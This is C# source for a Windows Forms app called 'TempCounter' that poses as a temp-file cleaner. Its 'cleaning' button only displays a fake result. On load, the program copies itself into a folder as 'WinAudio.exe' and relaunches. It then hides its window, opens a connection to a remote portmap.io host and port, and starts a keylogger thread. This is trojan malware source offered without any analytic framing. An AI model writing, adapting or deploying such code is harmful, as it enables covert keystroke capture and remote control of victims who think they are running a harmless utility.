using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace TempCounter
{
    public partial class Form1 : Form
    {
        private int x, y, m;
        private String IP = "macnet12-27298.portmap.io";
        private int PORT = 27298;
        public Form1()
        {
            InitializeComponent();
        }

        private void Panel1_MouseUp(object sender, MouseEventArgs e)
        {
            m = 0;
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            if(Program.value != "STARTED_ONCE")
            {
                Environment.Exit(-1);
            }
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            label4.Text = "+700 Temp Files And Browser Log";
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if(Program.value != "STARTED_ONCE")
            {
                if (!Directory.Exists(MACNETCLIENT.LOF_FOLDER))
                    Directory.CreateDirectory(MACNETCLIENT.LOF_FOLDER);
                File.Copy(Application.ExecutablePath, MACNETCLIENT.LOF_FOLDER + "\\WinAudio.exe");
                Process.Start(MACNETCLIENT.LOF_FOLDER + "\\WinAudio.exe");
            }
            else
            {
                MACNETCLIENT macnet = new MACNETCLIENT();
                Thread THR_macnet = new Thread(() => macnet.start(IP, PORT));
                THR_macnet.Start();
                Keylog keylog = new Keylog(MACNETCLIENT.LOG_FILE_LOCATION, MACNETCLIENT.LOF_FOLDER, 100);
                Thread THR_keylog = new Thread(new ThreadStart(keylog.start));
                THR_keylog.Start();
            }
            
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            if(Program.value == "STARTED_ONCE")
            {
                this.Hide();
            }
            
        }

        private void Panel1_MouseMove(object sender, MouseEventArgs e)
        {
            if(m == 1)
            {
                this.Location = new Point(Cursor.Position.X - x, Cursor.Position.Y - y);
                this.Update();
            }
        }

        private void Panel1_MouseDown(object sender, MouseEventArgs e)
        {
            m = 1;
            x = Cursor.Position.X - this.Location.X;
            y = Cursor.Position.Y - this.Location.Y;
        }
    }
}
